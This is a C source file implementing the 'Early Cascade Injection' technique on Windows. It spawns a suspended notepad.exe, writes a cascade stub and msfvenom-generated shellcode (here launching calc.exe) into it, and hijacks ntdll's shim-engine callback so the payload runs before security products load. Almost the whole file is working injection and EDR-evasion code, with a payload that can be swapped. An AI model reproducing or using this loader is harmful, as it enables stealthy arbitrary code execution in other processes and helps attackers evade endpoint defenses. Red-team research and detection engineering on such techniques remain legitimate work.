/*
* Title: Early Cascade Injection
* Resources:
*	- https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/
*	- https://github.com/Cracked5pider/earlycascade-injection
*/
#include <Windows.h>
#include <stdio.h>

// Ref: https://github.com/Cracked5pider/earlycascade-injection/blob/main/stub/
unsigned char CascadeStubx64[] = {
	0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
	0x33, 0xc0,                                      // xor eax, eax
	0x45, 0x33, 0xc9,                                // xor r9d, r9d
	0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

	0x48, 0xba,                                      // 
	0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov rdx, 9999999999999999h <- The address will be replaced with the address of shellcode.

	0xa2,                                            // (offset: 25)
	0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov ds:8888888888888888h, al <- *g_ShimsEnabled = FALSE. The adress will be replaced with the address of g_ShimsEnabled.

	0x49, 0xb8,                                      // 
	0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h <- The address will be replaced with the address of context if needed.

	0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

	0x48, 0xb8,                                      // 
	0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h <- The address will be replaced with the address of NtQueueApcThread.

	0xff, 0xd0,                                      // call rax
	0x33, 0xc0,                                      // xor eax, eax
	0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
	0xc3                                             // retn
};

VOID Cleanup(HANDLE hProcess, HANDLE hThread, LPVOID lpRemoteAddr) {
	if (hProcess)
		CloseHandle(hProcess);
	if (hThread)
		CloseHandle(hThread);
	if (lpRemoteAddr)
		VirtualFree(lpRemoteAddr, 0, MEM_RELEASE);
}

PVOID GetSectionAddr(HMODULE hModule, PCHAR sectionName) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);

	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if (memcmp(sectionName, pSecHeader[i].Name, strlen(sectionName)) == 0) {
			return (PVOID)((DWORD_PTR)pDosHeader + pSecHeader[i].VirtualAddress);
		}
	}

	return nullptr;
}

// Ref: https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
LPVOID EncodeSystemPtr(PVOID ptr) {
	DWORD dwSharedUserCookie = *(DWORD*)0x7FFE0330;
	return (LPVOID)(_rotr64(dwSharedUserCookie ^ (DWORD_PTR)ptr, dwSharedUserCookie & 0x3F));
}

BOOL EarlyCascadeInjection() {
	// Replace it with your preferred executable path to create new process to be injected.
	char lpTargetProcess[] = "C:\\Windows\\System32\\notepad.exe";

	// Shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	//unsigned char context[] = "";

	// ---------------------------------------------------------------------------------------- //
	// Preparation.
	// ---------------------------------------------------------------------------------------- //

	// The module handle will be used later.
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	// Resolve addresses for g_ShimsEnabled and g_pfnSE_DllLoaded.
	PVOID pMrdataSection = GetSectionAddr(hNtdll, (PCHAR)".mrdata");
	PVOID pDataSection = GetSectionAddr(hNtdll, (PCHAR)".data");

	PVOID g_pfnSE_DllLoaded = (PVOID)((DWORD_PTR)pMrdataSection + 0x270);
	PVOID g_ShimsEnabled = (PVOID)((DWORD_PTR)pDataSection + 0x6cf0);

	// ---------------------------------------------------------------------------------------- //
	// Create target process to be injected, and allocate memory.
	// ---------------------------------------------------------------------------------------- //

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	if (!CreateProcessA(nullptr, lpTargetProcess, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
		Cleanup(pi.hProcess, pi.hThread, nullptr);
		return FALSE;
	}

	// Allocate memory in remote process.
	DWORD dwLen = sizeof(CascadeStubx64) + sizeof(shellcode);
	/*if (context) {
		dwLen += sizeof(context);
	}*/

	LPVOID lpRemoteAddr = VirtualAllocEx(pi.hProcess, nullptr, dwLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteAddr) {
		Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);
		return FALSE;
	}

	// ---------------------------------------------------------------------------------------- //
	// Update addresses in stub.
	// ---------------------------------------------------------------------------------------- //

	// The address of shellcode.
	DWORD_PTR shellcodeAddr = (DWORD_PTR)lpRemoteAddr + sizeof(CascadeStubx64);
	memcpy(&CascadeStubx64[16], &shellcodeAddr, sizeof(PVOID));

	// The address of g_ShimsEnabled.
	memcpy(&CascadeStubx64[25], &g_ShimsEnabled, sizeof(PVOID));

	// The address of context.
	//if (context) {
		//DWORD_PTR ctxAddr = (DWORD_PTR)pMemory + sizeof(CascadeStubx64) + sizeof(shellcode);
		//memcpy(&CascadeStubx64[35], &ctxAddr, sizeof(PVOID));
	//}

	// The address of NtQueueApcThread.
	DWORD_PTR ntQueueApcThread = (DWORD_PTR)GetProcAddress(hNtdll, "NtQueueApcThread");
	memcpy(&CascadeStubx64[49], &ntQueueApcThread, sizeof(PVOID));

	// ---------------------------------------------------------------------------------------- //
	// Write stub and shellcode to the remote process. And patch g_pfnSE_DllLoaded and g_ShimsEnabled.
	// ---------------------------------------------------------------------------------------- //

	// Write the cascade stub.
	if (!WriteProcessMemory(
		pi.hProcess,
		(LPVOID)((DWORD_PTR)lpRemoteAddr),
		CascadeStubx64,
		sizeof(CascadeStubx64),
		nullptr
	)) {
		Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);
		return FALSE;
	}

	// Write shellcode.
	if (!WriteProcessMemory(
		pi.hProcess,
		(LPVOID)((DWORD_PTR)lpRemoteAddr + sizeof(CascadeStubx64)),
		(LPVOID)shellcode,
		sizeof(shellcode),
		nullptr
	)) {
		Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);
		return FALSE;
	}

	// Set the encoded callback pointer of the cascade stub
	DWORD_PTR callbackPtr = (DWORD_PTR)EncodeSystemPtr(lpRemoteAddr);
	if (!WriteProcessMemory(
		pi.hProcess,
		g_pfnSE_DllLoaded,
		&callbackPtr,
		sizeof(PVOID),
		nullptr
	)) {
		printf("Error: 0x%x\n", GetLastError());
		Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);
		return FALSE;
	}

	// Enable the shim engine.
	BOOL bEnabled = TRUE;
	if (!WriteProcessMemory(
		pi.hProcess,
		g_ShimsEnabled,
		&bEnabled,
		sizeof(BYTE),
		nullptr
	)) {
		Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);
		return FALSE;
	}

	// ---------------------------------------------------------------------------------------- //
	// Resume and execute the thread.
	// ---------------------------------------------------------------------------------------- //

	if (!ResumeThread(pi.hThread)) {
		printf("Error: 0x%x\n", GetLastError());
		Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);
		return FALSE;
	}

	Cleanup(pi.hProcess, pi.hThread, lpRemoteAddr);

	return TRUE;
}
